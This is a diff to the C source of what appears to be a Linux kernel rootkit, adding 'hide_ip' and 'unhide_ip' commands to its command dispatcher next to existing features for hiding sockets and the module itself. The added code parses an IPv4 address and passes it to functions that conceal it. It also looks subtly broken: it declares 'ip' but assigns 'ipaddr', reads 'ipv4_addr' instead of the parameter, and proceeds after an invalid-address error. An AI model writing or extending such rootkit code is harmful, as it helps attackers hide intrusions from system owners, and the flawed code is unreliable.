@@ -22,6 +22,9 @@ execute_command (void)
 {
 	int port;
 	pid_t pid;
+	__u32 ip;
+	
+	u8 tmp[4];
 
 	if(strcmp(command_buffer, "enable_netlog") == 0) {
 		if(param_counter > 0) {
@@ -85,6 +88,46 @@ execute_command (void)
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
 			unhide_udp_socket(port);
+		}
+		
+	} else if(strcmp(command_buffer, "hide_ip") == 0) {
+		if(param_counter > 0) {
+			/* convert ip string to an int array */
+			if(in4_pton(ipv4_addr, -1, tmp, -1, NULL) == 0) {
+				ROOTKIT_DEBUG("[func 'hide_ip'] Not a valid IP address!\n");
+			}
+
+			/* hack to convert byte array to __u32 */
+			ipaddr = 0;
+			ipaddr |= tmp[0] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[1] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[2] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[3] & 0xFF;
+
+			hide_ip_address(ipaddr);
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_ip") == 0) {
+		if(param_counter > 0) {
+			/* convert ip string to an int array */
+			if(in4_pton(ipv4_addr, -1, tmp, -1, NULL) == 0) {
+				ROOTKIT_DEBUG("[func 'unhide_ip'] Not a valid IP address!\n");
+			}
+
+			/* hack to convert byte array to __u32 */
+			ipaddr = 0;
+			ipaddr |= tmp[0] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[1] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[2] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[3] & 0xFF;
+
+			unhide_ip_address(ipaddr);
 		}
 		
 	} else if(strcmp(command_buffer, "hide_module") == 0) {
